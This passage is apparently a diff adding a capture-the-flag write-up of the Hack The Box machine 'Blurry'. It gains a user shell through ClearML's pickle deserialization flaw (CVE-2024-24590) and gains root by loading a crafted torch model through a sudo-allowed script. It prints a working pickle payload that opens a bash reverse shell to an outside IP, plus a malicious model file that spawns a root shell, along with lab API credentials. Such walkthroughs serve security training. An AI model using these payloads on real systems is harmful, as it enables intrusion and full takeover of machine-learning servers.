+  &lt;link rel="preload" href="app/webapp-common/assets/fonts/Heebo-Bold.ttf" as="font" type="font/ttf" crossorigin&gt;
+  &lt;link rel="preload" href="app/webapp-common/assets/fonts/Heebo-Light.ttf" as="font" type="font/ttf" crossorigin&gt;
+  &lt;link rel="preload" href="app/webapp-common/assets/fonts/Heebo-Medium.ttf" as="font" type="font/ttf" crossorigin&gt;
+  &lt;link rel="preload" href="app/webapp-common/assets/fonts/Heebo-Regular.ttf" as="font" type="font/ttf" crossorigin&gt;
+  &lt;link rel="preload" href="app/webapp-common/assets/fonts/Heebo-Thin.ttf" as="font" type="font/ttf" crossorigin&gt;
+  &lt;script&gt;
+    if (global === undefined) {
+      var global = window;
+    }
+  &lt;/script&gt;
+&lt;..SNIP..&gt;
+</code></pre>
+
+<p>The tool <code>whatweb</code> doesn’t show anymore interesting:</p>
+
+<pre><code class="language-bash">❯ whatweb http://app.blurry.htb
+http://app.blurry.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.19], Script[module], Title[ClearML], nginx[1.18.0]
+</code></pre>
+
+<p>In the browser, I can see more clearly that ClearML is a known software:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012112145.png" alt="" /></p>
+
+<blockquote>
+  <p>The project is available in github <a href="https://github.com/allegroai/clearml">here</a>.</p>
+</blockquote>
+
+<p>In the <a href="https://clear.ml/docs/latest/docs/">official page</a>, I can see that ClearML is a software to develop and test AI projects:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012112954.png" alt="" /></p>
+
+<p>The page just asks me for my full name so I will introduce it to see what happens:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012112330.png" alt="" /></p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012112647.png" alt="" /></p>
+
+<p>Clicking on “Get started” and “Create New credentials” shows me some credentials and instructions to access the api:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012112806.png" alt="" /></p>
+
+<p>There are some other subdomains (<code>api.blurry.htb</code> and <code>files.blurry.htb</code>) so I will add them to the /etc/hosts:</p>
+
+<pre><code class="language-bash">❯ sudo vi /etc/hosts
+10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb api.blurry.htb
+</code></pre>
+
+<p>I will replicate the installation and setup exactly:</p>
+
+<pre><code class="language-bash">❯ pip3 install clearml
+❯ clearml-init
+ClearML SDK setup process
+
+Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
+Or create a free account at https://app.clear.ml/settings/workspace-configuration
+
+In settings page, press "Create new credentials", then press "Copy to clipboard".
+
+Paste copied configuration here:
+api {
+  web_server: http://app.blurry.htb
+  api_server: http://api.blurry.htb
+  files_server: http://files.blurry.htb
+  credentials {
+    "access_key" = "LEW51MSGF4CB4PEKWR0M"
+    "secret_key" = "he1KxVtnLtHv4UfjB5c3tcvyGvg2KRt81kUWthSy2m0dkb68vp"
+  }
+}
+Detected credentials key="LEW51MSGF4CB4PEKWR0M" secret="he1K***"
+
+ClearML Hosts configuration:
+Web App: http://app.blurry.htb
+API: http://api.blurry.htb
+File Store: http://files.blurry.htb
+
+Verifying credentials ...
+Credentials verified!
+
+New configuration stored in /home/gabri/clearml.conf
+ClearML setup completed successfully.
+</code></pre>
+
+<p>To check if it works, I can try to execute the given code:</p>
+
+<pre><code class="language-bash">❯ vi test.py
+from clearml import Task 
+task = Task.init(project_name="my project", task_name="my task")
+❯ python3 test.py
+ClearML Task: created new task id=0260cee634c84a819dcaebf9a523ba51
+2024-10-12 11:48:04,221 - clearml.Task - INFO - No repository found, storing script code instead
+ClearML results page: http://app.blurry.htb/projects/0cc142836b1d469ab8cac8b15fc5883b/experiments/0260cee634c84a819dcaebf9a523ba51/output/log
+CLEARML-SERVER new package available: UPGRADE to v1.16.2 is recommended!
+Release Notes:
+### Bug Fixes
+- Fix no graphs are shown in workers and queues screens
+ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring
+</code></pre>
+
+<p>It works. And the project “my project” is available in the dashboard:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012114939.png" alt="" /></p>
+
+<p>In the settings page, I can see the ClearML version:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012115434.png" alt="" /></p>
+
+<p>Looking for vulnerabilities affecting to this version, I saw <a href="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/">this article</a> that talks about 6 vulnerabilities that the hiddenlayer research team have detected and reported:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012115612.png" alt="" /></p>
+    
+      <h1 id="access-as-jippity">
+        
+        
+          Access as jippity <a href="#access-as-jippity" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="cve-2024-24590">
+        
+        
+          CVE-2024-24590 <a href="#cve-2024-24590" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>The most interesting vulnerability affecting to this version of ClearML is CVE-2024-24590, which can be used to load a pickle serialized object in a victim user and execute commands remotely:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012120823.png" alt="" /></p>
+
+<p>The exploit occurs when a user interacts with the uploaded pickle:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012121840.png" alt="" /></p>
+
+<p>And there is a project that I haven’t created called “Black Swan” so it belongs to another user:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012122155.png" alt="" /></p>
+
+<p>So in case that a user (bot) reviews the tasks from the project ‘Black Swan’ and calls the <code>get</code> method of the <code>Artifact</code> class, he will execute my pickle file and I will be able to execute remote commands.</p>
+    
+      <h2 id="review-json-artifacts-experiment">
+        
+        
+          “Review JSON Artifacts” experiment <a href="#review-json-artifacts-experiment" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>The “Review JSON Artifacts” experiment is being executed after a certain time and it’s like this:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012132040.png" alt="" /></p>
+
+<p>This is the code:</p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+
+from clearml import Task
+from multiprocessing import Process
+from clearml.backend_api.session.client import APIClient
+
+def process_json_artifact(data, artifact_name):
+    """
+    Process a JSON artifact represented as a Python dictionary.
+    Print all key-value pairs contained in the dictionary.
+    """
+    print(f"[+] Artifact '{artifact_name}' Contents:")
+    for key, value in data.items():
+        print(f" - {key}: {value}")
+
+def process_task(task):
+    artifacts = task.artifacts
+    
+    for artifact_name, artifact_object in artifacts.items():
+        data = artifact_object.get()
+        
+        if isinstance(data, dict):
+            process_json_artifact(data, artifact_name)
+        else:
+            print(f"[!] Artifact '{artifact_name}' content is not a dictionary.")
+
+def main():
+    review_task = Task.init(project_name="Black Swan", 
+                            task_name="Review JSON Artifacts", 
+                            task_type=Task.TaskTypes.data_processing)
+
+    # Retrieve tasks tagged for review
+    tasks = Task.get_tasks(project_name='Black Swan', tags=["review"], allow_archived=False)
+
+    if not tasks:
+        print("[!] No tasks up for review.")
+        return
+    
+    threads = []
+    for task in tasks:
+        print(f"[+] Reviewing artifacts from task: {task.name} (ID: {task.id})")
+        p = Process(target=process_task, args=(task,))
+        p.start()
+        threads.append(p)
+        task.set_archived(True)
+
+    for thread in threads:
+        thread.join(60)
+        if thread.is_alive():
+            thread.terminate()
+
+    # Mark the ClearML task as completed
+    review_task.close()
+
+def cleanup():
+    client = APIClient()
+    tasks = client.tasks.get_all(
+        system_tags=["archived"],
+        only_fields=["id"],
+        order_by=["-last_update"],
+        page_size=100,
+        page=0,
+    )
+
+    # delete and cleanup tasks
+    for task in tasks:
+        # noinspection PyBroadException
+        try:
+            deleted_task = Task.get_task(task_id=task.id)
+            deleted_task.delete(
+                delete_artifacts_and_models=True,
+                skip_models_used_by_other_tasks=True,
+                raise_on_error=False
+            )
+        except Exception as ex:
+            continue
+
+if __name__ == "__main__":
+    main()
+    cleanup()
+</code></pre>
+
+<p>First, it just takes the tasks of the project “Black Swan” that are tagged for review:</p>
+
+<pre><code class="language-python">review_task = Task.init(project_name="Black Swan", 
+                            task_name="Review JSON Artifacts", 
+                            task_type=Task.TaskTypes.data_processing)
+
+    # Retrieve tasks tagged for review
+    tasks = Task.get_tasks(project_name='Black Swan', tags=["review"], allow_archived=False)
+</code></pre>
+
+<p>Then, each task is passed to the function process_task:</p>
+
+<pre><code class="language-python">for task in tasks:
+        print(f"[+] Reviewing artifacts from task: {task.name} (ID: {task.id})")
+        p = Process(target=process_task, args=(task,))
+        p.start()
+        threads.append(p)
+        task.set_archived(True)
+</code></pre>
+
+<p>Finally, the process_task function uses the get method from the artifact and process it with the function <code>process_json_artifact</code> (which is not relevant in this case):</p>
+
+<pre><code class="language-python">def process_task(task):
+    artifacts = task.artifacts
+    
+    for artifact_name, artifact_object in artifacts.items():
+        data = artifact_object.get()
+        
+        if isinstance(data, dict):
+            process_json_artifact(data, artifact_name)
+        else:
+            print(f"[!] Artifact '{artifact_name}' content is not a dictionary.")
+</code></pre>
+
+<p>The <code>get</code> method from the artifact is the one that triggers the pickle deserialization as saw in the research article so I can create a task in the project “Black Swan” with the ‘review’ tag and execute any command I want on the victim machine.</p>
+    
+      <h2 id="exploitation">
+        
+        
+          Exploitation <a href="#exploitation" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>I will spawn a <code>nc</code> listener and upload an artifact with a command that gives me a reverse shell:</p>
+
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<p>This will be my exploit.py (from the research page). I modified the project name to be “Black Swan” and specified the ‘review’ tag because that’s what the “Review JSON artifacts” experiment searches for:</p>
+
+<pre><code class="language-python">import pickle
+import os
+from clearml import Task
+
+class RunCommand:
+    def __reduce__(self):
+        return (os.system, ('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.30/443 0&gt;&amp;1"',))
+
+command = RunCommand()
+
+task = Task.init(project_name="Black Swan", task_name="pickle_artifact_upload", output_uri=True, tags=['review'])
+
+task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name='.pkl')
+</code></pre>
+
+<p>It executes correctly:</p>
+
+<pre><code class="language-bash">❯ python3 exploit.py
+ClearML Task: created new task id=ef082f7a58244cbd9b3f040fec5dea6c
+2024-10-12 13:15:12,962 - clearml.Task - INFO - No repository found, storing script code instead
+CLEARML-SERVER new package available: UPGRADE to v1.16.2 is recommended!
+Release Notes:
+### Bug Fixes
+- Fix no graphs are shown in workers and queues screens
+ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/ef082f7a58244cbd9b3f040fec5dea6c/output/log
+ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring
+</code></pre>
+
+<p>And I receive a shell as jippity user:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012131705.png" alt="" /></p>
+
+<p>I will do tty treatment to stabilize the shell, be able to do ctrl+l, ctrl+c without killing the shell, etc:</p>
+
+<pre><code class="language-bash">jippity@blurry:~$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+jippity@blurry:~$ ^Z
+[1]  + 566365 suspended  nc -lvnp 443
+❯ stty raw -echo; fg
+[1]  + 566365 continued  nc -lvnp 443
+                                     reset xterm
+jippity@blurry:~$ export TERM=xterm
+jippity@blurry:~$ export SHELL=bash
+jippity@blurry:~$ stty rows 50 cols 184
+</code></pre>
+
+<ul>
+  <li><code>script /dev/null -c bash</code>: Spawns a tty.</li>
+  <li><code>ctrl+z</code>: puts the shell in background for later doing a treatment.</li>
+  <li><code>stty raw -echo;fg</code>: gives the shell back again.</li>
+  <li><code>reset xterm</code>: resets the terminal to give the bash console.</li>
+  <li><code>export TERM=xterm</code>: lets do ctrl+l to clean the terminal.</li>
+  <li><code>export SHELL=bash</code>: specifies the system that it’s using a bash console.</li>
+  <li><code>stty rows &lt;YOUR ROWS&gt; cols &lt;YOUR COLUMNS&gt;</code>: sets the size of the current full terminal window. It is possible to view the right size for your window running <code>stty size</code> in a entire new window on your terminal.</li>
+</ul>
+
+<p>The flag is available in jippity’s home directory:</p>
+
+<pre><code class="language-bash">jippity@blurry:~$ ls
+automation  clearml.conf  user.txt
+jippity@blurry:~$ cat user.txt 
+3e****************************74
+</code></pre>
+    
+      <h1 id="access-as-root">
+        
+        
+          Access as root <a href="#access-as-root" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>User jippity has sudoers privilege to execute <code>/usr/bin/evaluate_model /models/*.pth</code> without entering password (<code>NOPASSWD</code>):</p>
+
+<pre><code class="language-bash">jippity@blurry:~$ sudo -l
+Matching Defaults entries for jippity on blurry:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jippity may run the following commands on blurry:
+    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
+</code></pre>
+
+<p><code>/usr/bin/evaluate_model</code> is a shell script:</p>
+
+<pre><code class="language-bash">jippity@blurry:~$ file /usr/bin/evaluate_model 
+/usr/bin/evaluate_model: Bourne-Again shell script, ASCII text executable
+</code></pre>
+
+<p>But it’s owned by root and it’s not writable by me:</p>
+
+<pre><code class="language-bash">jippity@blurry:~$ ls -l /usr/bin/evaluate_model 
+-rwxr-xr-x 1 root root 1537 Feb 17  2024 /usr/bin/evaluate_model
+</code></pre>
+
+<p>However I can analyze the code to see if there is any flaw.</p>
+    
+      <h2 id="analysis-of-usrbinevaluate_model">
+        
+        
+          Analysis of <code>/usr/bin/evaluate_model</code> <a href="#analysis-of-usrbinevaluate_model" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>This is the code from the evaluate_model script:</p>
+
+<pre><code class="language-bash">jippity@blurry:~$ cat /usr/bin/evaluate_model 
+#!/bin/bash
+# Evaluate a given model against our proprietary dataset.
+# Security checks against model file included.
+
+if [ "$#" -ne 1 ]; then
+    /usr/bin/echo "Usage: $0 &lt;path_to_model.pth&gt;"
+    exit 1
+fi
+
+MODEL_FILE="$1"
+TEMP_DIR="/models/temp"
+PYTHON_SCRIPT="/models/evaluate_model.py"  
+
+/usr/bin/mkdir -p "$TEMP_DIR"
+
+file_type=$(/usr/bin/file --brief "$MODEL_FILE")
+
+# Extract based on file type
+if [[ "$file_type" == *"POSIX tar archive"* ]]; then
+    # POSIX tar archive (older PyTorch format)
+    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
+elif [[ "$file_type" == *"Zip archive data"* ]]; then
+    # Zip archive (newer PyTorch format)
+    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
+else
+    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
+    exit 2
+fi
+
+/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
+    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")
+
+    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' &gt;/dev/null; then
+        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
+        /bin/rm "$MODEL_FILE"
+        break
+    fi
+done
+
+/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
+/bin/rm -rf "$TEMP_DIR"
+
+if [ -f "$MODEL_FILE" ]; then
+    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
+    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
+    
+fi
+</code></pre>
+
+<p>First, it checks if an argument was passed to specify a model file:</p>
+
+<pre><code class="language-bash"># Evaluate a given model against our proprietary dataset.
+# Security checks against model file included.
+
+if [ "$#" -ne 1 ]; then
+    /usr/bin/echo "Usage: $0 &lt;path_to_model.pth&gt;"
+    exit 1
+fi
+
+MODEL_FILE="$1"
+TEMP_DIR="/models/temp"
+PYTHON_SCRIPT="/models/evaluate_model.py"  
+</code></pre>
+
+<p>Then, it creates the directory <code>/models/temp</code> and checks if the specified file is a tar or zip archive and it extracts the file to the temp dir <code>/models/temp</code>:</p>
+
+<pre><code class="language-bash">/usr/bin/mkdir -p "$TEMP_DIR"
+
+file_type=$(/usr/bin/file --brief "$MODEL_FILE")
+
+# Extract based on file type
+if [[ "$file_type" == *"POSIX tar archive"* ]]; then
+    # POSIX tar archive (older PyTorch format)
+    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
+elif [[ "$file_type" == *"Zip archive data"* ]]; then
+    # Zip archive (newer PyTorch format)
+    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
+else
+    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
+    exit 2
+fi
+</code></pre>
+
+<p>After that, it makes some security checks with <code>fickling</code> over the passed file and removes the temp directory and its files:</p>
+
+<pre><code class="language-bash">/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
+    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")
+
+    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' &gt;/dev/null; then
+        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
+        /bin/rm "$MODEL_FILE"
+        break
+    fi
+done
+
+/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
+/bin/rm -rf "$TEMP_DIR"
+</code></pre>
+
+<p>Finally, it executes /models/evaluate_model.py with python3 and the model file as argument:</p>
+
+<pre><code class="language-bash">if [ -f "$MODEL_FILE" ]; then
+    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
+    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
+    
+fi
+</code></pre>
+
+<p>Let’s analyze the python script.</p>
+    
+      <h2 id="analysis-of-modelsevaluate_modelpy">
+        
+        
+          Analysis of <code>/models/evaluate_model.py</code> <a href="#analysis-of-modelsevaluate_modelpy" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<pre><code class="language-python">jippity@blurry:~$ cat /models/evaluate_model.py
+import torch
+import torch.nn as nn
+from torchvision import transforms
+from torchvision.datasets import CIFAR10
+from torch.utils.data import DataLoader, Subset
+import numpy as np
+import sys
+
+
+class CustomCNN(nn.Module):
+    def __init__(self):
+        super(CustomCNN, self).__init__()
+        self.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1)
+        self.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1)
+        self.pool = nn.MaxPool2d(kernel_size=2, stride=2, padding=0)
+        self.fc1 = nn.Linear(in_features=32 * 8 * 8, out_features=128)
+        self.fc2 = nn.Linear(in_features=128, out_features=10)
+        self.relu = nn.ReLU()
+
+    def forward(self, x):
+        x = self.pool(self.relu(self.conv1(x)))
+        x = self.pool(self.relu(self.conv2(x)))
+        x = x.view(-1, 32 * 8 * 8)
+        x = self.relu(self.fc1(x))
+        x = self.fc2(x)
+        return x
+
+
+def load_model(model_path):
+    model = CustomCNN()
+    
+    state_dict = torch.load(model_path)
+    model.load_state_dict(state_dict)
+    
+    model.eval()  
+    return model
+
+def prepare_dataloader(batch_size=32):
+    transform = transforms.Compose([
+	transforms.RandomHorizontalFlip(),
+	transforms.RandomCrop(32, padding=4),
+        transforms.ToTensor(),
+        transforms.Normalize(mean=[0.4914, 0.4822, 0.4465], std=[0.2023, 0.1994, 0.2010]),
+    ])
+    
+    dataset = CIFAR10(root='/root/datasets/', train=False, download=False, transform=transform)
+    subset = Subset(dataset, indices=np.random.choice(len(dataset), 64, replace=False))
+    dataloader = DataLoader(subset, batch_size=batch_size, shuffle=False)
+    return dataloader
+
+def evaluate_model(model, dataloader):
+    correct = 0
+    total = 0
+    with torch.no_grad():  
+        for images, labels in dataloader:
+            outputs = model(images)
+            _, predicted = torch.max(outputs.data, 1)
+            total += labels.size(0)
+            correct += (predicted == labels).sum().item()
+    
+    accuracy = 100 * correct / total
+    print(f'[+] Accuracy of the model on the test dataset: {accuracy:.2f}%')
+
+def main(model_path):
+    model = load_model(model_path)
+    print("[+] Loaded Model.")
+    dataloader = prepare_dataloader()
+    print("[+] Dataloader ready. Evaluating model...")
+    evaluate_model(model, dataloader)
+
+if __name__ == "__main__":
+    if len(sys.argv) &lt; 2:
+        print("Usage: python script.py &lt;path_to_model.pth&gt;")
+    else:
+        model_path = sys.argv[1]  # Path to the .pth file
+        main(model_path)
+</code></pre>
+
+<p>The function executed at the beginning is main with the model_path file as argument:</p>
+
+<pre><code class="language-python">if __name__ == "__main__":
+    if len(sys.argv) &lt; 2:
+        print("Usage: python script.py &lt;path_to_model.pth&gt;")
+    else:
+        model_path = sys.argv[1]  # Path to the .pth file
+        main(model_path)
+</code></pre>
+
+<p>So it’s obvious to start the analysis there. First, it loads the model with the load_model function, then executes the prepare_dataloader function and finally, it calls evaluate_model with the returned data of <code>load_model</code> and <code>dataloader</code> as arguments:</p>
+
+<pre><code class="language-python">def main(model_path):
+    model = load_model(model_path)
+    print("[+] Loaded Model.")
+    dataloader = prepare_dataloader()
+    print("[+] Dataloader ready. Evaluating model...")
+    evaluate_model(model, dataloader)
+</code></pre>
+    
+      <h3 id="function-load_model">
+        
+        
+          Function <code>load_model</code>
+        
+        
+      </h3>
+
+<p>This function uses the CustomCNN class and the <code>torch</code> module to load the model path:</p>
+
+<pre><code class="language-python">def load_model(model_path):
+    model = CustomCNN()
+    
+    state_dict = torch.load(model_path)
+    model.load_state_dict(state_dict)
+    
+    model.eval()  
+    return model
+</code></pre>
+
+<p>CustomCNN is an inheritance of <code>nn.Module</code>:</p>
+
+<pre><code class="language-bash">class CustomCNN(nn.Module):
+    def __init__(self):
+        super(CustomCNN, self).__init__()
+        self.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1)
+        self.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1)
+        self.pool = nn.MaxPool2d(kernel_size=2, stride=2, padding=0)
+        self.fc1 = nn.Linear(in_features=32 * 8 * 8, out_features=128)
+        self.fc2 = nn.Linear(in_features=128, out_features=10)
+        self.relu = nn.ReLU()
+
+    def forward(self, x):
+        x = self.pool(self.relu(self.conv1(x)))
+        x = self.pool(self.relu(self.conv2(x)))
+        x = x.view(-1, 32 * 8 * 8)
+        x = self.relu(self.fc1(x))
+        x = self.fc2(x)
+        return x
+</code></pre>
+
+<p>And <code>nn</code> is imported from torch at the beginning of the script:</p>
+
+<pre><code class="language-python">import torch.nn as nn
+</code></pre>
+
+<p>The <a href="https://pypi.org/project/torch/"><code>torch</code></a> package is used to create neural networks:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012144507.png" alt="" /></p>
+
+<p><a href="https://pytorch.org/docs/stable/generated/torch.load.html#torch.load"><code>torch.load</code></a> is being used with the model path as argument (<code>state_dict = torch.load(model_path)</code>). This is interesting because it uses pickle to deserialize the file content:</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012145359.png" alt="" /></p>
+
+<p>Then, it uses the deserialized data to load the state_dict (<code>model.load_state_dict(state_dict)</code>):</p>
+
+<p><img src="/assets/images/Blurry/Pasted%20image%2020241012145725.png" alt="" /></p>
+
+<p>However this is no relevant because the important exploitable thing is that it deserializes the data with pickle.</p>
+    
+      <h2 id="abusing-torchload---pickle-deserialization">
+        
+        
+          Abusing <code>torch.load()</code> - Pickle deserialization <a href="#abusing-torchload---pickle-deserialization" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>After reading the <a href="https://pytorch.org/tutorials/beginner/saving_loading_models.html">documentation on how to create a model</a> that torch could interpret, I was able to create this script that creates a model in a file <code>model.pth</code> that executes a bash:</p>
+
+<pre><code class="language-python">import torch
+import os
+
+class malicious:
+    def __reduce__(self):
+        cmd = ('bash')
+        return os.system, (cmd,)
+
+model = malicious()
+
+torch.save(model, 'model.pth')
+</code></pre>
+
+<p>Let’s execute it to create the model:</p>
+
+<pre><code class="language-bash">❯ python3 createTorchModel.py
+❯ ls model.pth
+model.pth
+</code></pre>
+
+<p>If I test to load this model locally in my python interpreter with torch, I can see it successfully works and executes a bash:</p>
+
+<pre><code class="language-bash">❯ ls
+createTorchModel.py  model.pth
+❯ python3
+Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; import torch
+&gt;&gt;&gt; torch.load('model.pth')
+&lt;..SNIP..&gt;
+gabri@kali:~/Desktop/HTB/machines/Blurry-10.10.11.19/exploits$ 
+</code></pre>
+
+<p>So I will share the model using a http server and download it in the victim machine at the <code>/models</code> folder:</p>
+
+<pre><code class="language-bash">❯ ls; python3 -m http.server 80
+createTorchModel.py  model.pth
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<pre><code class="language-bash">jippity@blurry:~$ cd /models
+jippity@blurry:/models$ wget http://10.10.14.30/model.pth
+</code></pre>
+
+<p>Now, because the sudoers privilege, I should be able to execute this as root. Let’s try:</p>
+
+<pre><code class="language-plaintext">jippity@blurry:/models$ sudo /usr/bin/evaluate_model /models/model.pth
+[+] Model /models/model.pth is considered safe. Processing...
+root@blurry:/models# whoami
+root
+</code></pre>
+
+<p>It worked! Now I can see the root flag in root’s folder:</p>
+
+<pre><code class="language-bash">root@blurry:/models# cd /root/
+root@blurry:~# ls
+datasets  root.txt
+root@blurry:~# cat root.txt 
+fa****************************3a
+</code></pre>
+
+<p>That’s the machine guys. Hope you liked it!</p>
+
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>12 October 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=clearml" class="tag" style="font-family: 'Cascadia Code';">clearml</a>
+    
+    <a href="/search?q=machine-learning" class="tag" style="font-family: 'Cascadia Code';">machine-learning</a>
+    
+    <a href="/search?q=CVE-2024-24590" class="tag" style="font-family: 'Cascadia Code';">CVE-2024-24590</a>
+    
+    <a href="/search?q=pickle" class="tag" style="font-family: 'Cascadia Code';">pickle</a>
+    
+    <a href="/search?q=deserialization" class="tag" style="font-family: 'Cascadia Code';">deserialization</a>
+    
+    <a href="/search?q=python-torch" class="tag" style="font-family: 'Cascadia Code';">python-torch</a>
+    
+    <a href="/search?q=sudoers" class="tag" style="font-family: 'Cascadia Code';">sudoers</a>
+    
+    
+</div>
+  <br>
+  Share this writeup:&nbsp;
+  <a
+    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/HTB/Blurry.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/HTB/Blurry.html&text=Writeup+for+HTB Blurry writeup+from+HTB+held+on+12 October 2024&hashtags=ctf,writeup,Blurry,HTB,clearml,machine-learning,CVE-2024-24590,pickle,deserialization,python-torch,sudoers','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/HTB/Blurry.html&text=Writeup+for+HTB Blurry writeup+from+HTB+held+on+2024-10-12 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
